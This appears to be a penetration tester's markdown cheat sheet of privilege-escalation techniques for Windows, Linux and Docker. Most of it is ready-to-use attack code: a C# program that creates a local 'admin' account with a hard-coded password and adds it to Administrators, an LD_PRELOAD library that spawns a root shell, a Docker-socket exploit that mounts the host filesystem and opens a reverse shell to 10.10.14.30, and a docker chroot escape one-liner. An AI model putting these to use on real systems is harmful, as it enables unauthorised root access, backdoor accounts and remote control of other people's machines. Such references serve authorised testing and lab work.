# Windows
## Privilege Escalation Scripts
- [PrivescCheck [20220608]](https://github.com/itm4n/PrivescCheck)
- [Windows Privilege Escalation Awesome Scripts [20220501]](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

## Add a user to the local system - C#
- [Add a user to the local system - C#](https://docs.microsoft.com/en-us/troubleshoot/developer/visualstudio/csharp/language-compilers/add-user-local-system)
```csharp
// "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /target:exe /r:"C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.DirectoryServices.dll" Program.cs

using System;
using System.DirectoryServices;

class Class1
{
    static void Main(string[] args)
    {
        try
        {
            DirectoryEntry AD = new DirectoryEntry("WinNTc://" +
            Environment.MachineName + ",computer");
            DirectoryEntry NewUser = AD.Children.Add("admin", "user");
            NewUser.Invoke("SetPassword", new object[] {"#12345Abc"});
            NewUser.Invoke("Put", new object[] {"Description", "Test User from .NET"});
            NewUser.CommitChanges();
            DirectoryEntry grp;

            grp = AD.Children.Find("Administrators", "group");
            if (grp != null) {grp.Invoke("Add", new object[] {NewUser.Path.ToString()});}
            Console.WriteLine("Account Created Successfully");
            Console.ReadLine();
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
            Console.ReadLine();
        }
    }
}
```

## Unquoted Service Paths

### WMIC
```batchfile
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

### PowerShell
```powershell
$result = $null
$result = Get-WmiObject win32_service | Where-Object {($_.PathName -like '* *') -and ($_.PathName -notlike '*"*') -and ($_.PathName -notlike '*C:\Windows*')} | ForEach-Object { Write $_.PathName }
if ($result -ne $null) { Write $result | Sort -Unique } else { Write "Weak services were not found." }
```

### Specific service
```batchfile
sc qc "<service name>"
```

# Linux
## LD_PRELOAD
```c
// gcc -fPIC -shared -o shell.so shell.c -nostartfiles
// sudo LD_PRELOAD=/tmp/shell.so <suid_elf_or_scrip>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/usr/bin/bash");
}
```

## [pspy - unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)

```sh
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 

# place watchers recursively in two directories and non-recursively into a third
./pspy64 -r /path/to/first/recursive/dir -r /path/to/second/recursive/dir -d /path/to/the/non-recursive/dir

# disable printing discovered commands but enable file system events
./pspy64 -p=false -f
```

# Docker
## [exploit-docker-sock.sh](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25)
```sh
#!/bin/bash

# you can see images availables with
# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
# here we have sandbox:latest

# command executed when container is started
# change dir to tmp where the root fs is mount and execute reverse shell

cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i &>/dev/tcp/10.10.14.30/12348 0<&1'\\\"\"]"

# create the container and execute command, bind the root filesystem to it, name the container peterpwn_root and execute as detached (-d)
curl -s -X POST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$cmd,\"Binds\":[\"/:/tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=peterpwn_root

# start the container
curl -s -X POST --unix-socket /var/run/docker.sock "http://localhost/containers/peterpwn_root/start"
```

## [GTFOBins](https://gtfobins.github.io/gtfobins/docker/)
```sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Finding some interesting ports
```sh
grep -R "<port>" </opt>
```

